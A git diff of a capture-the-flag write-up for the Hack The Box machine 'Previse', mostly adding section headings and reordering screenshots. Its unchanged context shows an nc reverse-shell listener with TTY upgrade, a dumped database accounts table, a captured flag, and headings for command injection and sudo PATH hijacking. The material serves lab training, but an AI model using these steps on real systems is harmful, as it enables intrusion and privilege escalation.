@@ -21,7 +21,7 @@ layout:
 
 ***
 
-
+## Reconnaissance
 
 
 
@@ -112,6 +112,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/5282_vmware_jgmq6S4Ttx.png" alt=""><figcaption></figcaption></figure>
 
+## Web Enumeration
+
 
 
 ```bash
@@ -122,11 +124,11 @@ http://10.10.11.104/login.php [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Count
 
 
 
-<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -175,13 +177,17 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 302      GET       71l      164w     2801c http://10.10.11.104/ => login.php
 ```
 
+## Initial Foothold
 
-
-<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
+### Execution After Redirect (EAR) Vulnerability - Skipping Redirects
 
 
 
 <figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -238,10 +244,6 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 
-<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
-
-
-
 <figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
 
 
@@ -254,15 +256,13 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 
-status.php
-
 <figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>
 
 
 
+status.php
+
 <figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>
-
-
 
 
 
@@ -270,13 +270,21 @@ status.php
 
 
 
+
+
 <figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>
 
 
 
-
-
 <figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### PHP Source Code Analysis
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -341,24 +349,18 @@ if (!isset($_SESSION['user'])) {
 ```
 {% endcode %}
 
+### Command Injection (RCE)
 
 
 
+<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
 
-Previse File Access Logs
 
-### Request Log Data
-
-We take security very seriously, and keep logs of file access actions. We can set delimters for your needs!
-
-Find out which users have been downloading files.
-
-File delimeter: commaspacetabSubmit
 
 
 
 ```bash
-❯ catnp out.log
+❯ cat out.log
 time,user,fileID
 1622482496,m4lwhere,4
 1622485614,m4lwhere,4
@@ -456,17 +458,14 @@ zsh: suspended  nc -nlvp 443
 ❯ stty raw -echo;fg
 [1]  + continued  nc -nlvp 443
                               reset xterm
-```
-
-
-
-```bash
 www-data@previse:/var/www/html$ export TERM=xterm
 www-data@previse:/var/www/html$ export SHELL=bash
 www-data@previse:/var/www/html$ stty rows 46 columns 230
 ```
 
+## Initial Access
 
+### Information Leakage
 
 ```bash
 www-data@previse:/var/www/html$ cat config.php 
@@ -483,6 +482,8 @@ function connectDB(){
 
 ?>
 ```
+
+### Database Enumeration
 
 
 
@@ -523,6 +524,8 @@ mysql> SELECT * FROM accounts;
 +----+----------+------------------------------------+---------------------+
 3 rows in set (0.00 sec)
 ```
+
+### Cracking hashes
 
 
 
@@ -572,9 +575,9 @@ m4lwhere@previse:~$ cat user.txt
 b3888321b679faa26e5bb8b757c33362
 ```
 
+## Privilege Escalation
 
-
-
+### Abusing Sudoers Privilege + PATH Hijacking
 
 ```bash
 m4lwhere@previse:~$ sudo -l
